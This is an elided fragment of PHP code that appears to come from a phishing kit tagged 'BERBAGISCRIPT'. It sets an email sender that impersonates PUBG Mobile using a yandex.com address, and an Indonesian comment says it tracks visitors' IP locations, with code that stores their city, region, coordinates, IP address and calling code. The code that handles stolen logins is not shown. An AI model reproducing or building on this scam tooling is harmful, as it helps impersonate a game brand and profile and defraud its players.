...
$author = 'BERBAGISCRIPT';
$sender = 'From: PUBGMOBILE <pubgmobile@yandex.com>';
...
// PHP File untuk melacak lokasi IP
...
// Memberi Inisial Data Function agar lebih singkat
$continent_ip = $apiGL['time_zone'];
$country_ip = $apiGL['country_name'];
$city_ip = $apiGL['city'];
$region_ip = $apiGL['region_name'];
$callcode_ip = '+'.$apiGL['callingCode'];
$lat_ip = $apiGL['latitude'];
$lon_ip = $apiGL['longitude'];
$ipaddress = $apiGL['ip'];
$country_cd = $apiGL['country_code'];
$flag = $apiGL['emojiFlag'];
$uang = $apiGL['currencySymbol'];
$zone = $apiGL['time_zone'];
